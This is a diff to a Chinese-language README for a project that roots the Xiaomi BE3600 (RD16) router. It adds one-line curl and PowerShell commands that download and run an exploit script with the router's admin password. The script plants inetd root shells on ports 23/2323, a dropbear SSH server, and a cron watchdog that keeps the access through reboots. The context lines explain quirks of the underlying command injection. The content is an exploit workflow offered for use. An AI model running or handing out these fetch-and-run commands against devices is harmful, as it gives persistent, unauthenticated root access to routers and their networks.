@@ -49,10 +49,28 @@ dropbear + authorized_keys ────► :22 SSH（密钥/密码均可用）
 | 数字结尾碎片 | `echo -n ..D>/tmp/N`（D 为数字）被解析成 `D>` fd 重定向、文件写空——需在 `>` 前补空格（`..D >/tmp/N`） |
 | 可写区域 | `/etc` ramfs 重启全清；`/data`、`/etc/crontabs`（sec_cfg）、`/etc/config` 持久 |
 
+## 懒人单命令（免克隆，全自动）
+
+macOS / Linux（需 `python3` + `curl`）：
+
+```bash
+curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist
+```
+
+Windows PowerShell（`python` 不存在就把命令里的 `python` 换成 `py`）：
+
+```powershell
+irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist
+```
+
+- `--stage persist` = 全自动：注入 → inetd（:23/:2323 root shell）→ dropbear（:22 SSH）→ `/data` + cron 看门狗，重启自动恢复
+- 追加 `--pubkey 'ssh-rsa AAAA...'` 可同时写入 SSH 公钥，之后 `ssh root@192.168.31.1`
+- 只要一次性 shell：把 `--stage persist` 换成 `--stage shell`，完成后 `nc 192.168.31.1 23`
+
 ## 快速复现（exploit.py）
 
 ```bash
-git clone <this-repo> && cd xiaomi-be3600-rd16-ssh
+git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh
 
 python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage shell
 # 之后: nc <路由器IP> 23  →  root /bin/sh
